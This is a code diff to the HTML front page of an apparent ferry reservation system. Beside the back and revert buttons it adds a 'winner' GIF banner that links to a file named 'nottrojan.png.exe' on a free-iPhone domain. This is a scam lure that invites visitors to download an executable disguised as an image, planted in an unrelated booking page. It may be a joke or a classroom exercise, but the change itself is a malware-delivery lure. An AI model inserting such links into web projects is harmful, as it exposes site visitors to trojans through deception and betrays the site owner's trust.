@@ -14,6 +14,11 @@
     <body onload="load();">
         <button class="back-btn" onclick="goFront()">Back to Home</button>
         <button class="back-btn" onclick="goBack()">Revert</button>
+        <div>
+            <a href="http://www.freeiphone.com/nottrojan.png.exe" target="_blank">
+                <img src="images/winner2.gif">    
+            </a>
+        </div>
         <div class="header-wrapper">
             <span class="header-title">Create a Reservation:</span>
             <span class="header-description">Welcome to our ferry reservation system. Making a reservation is 
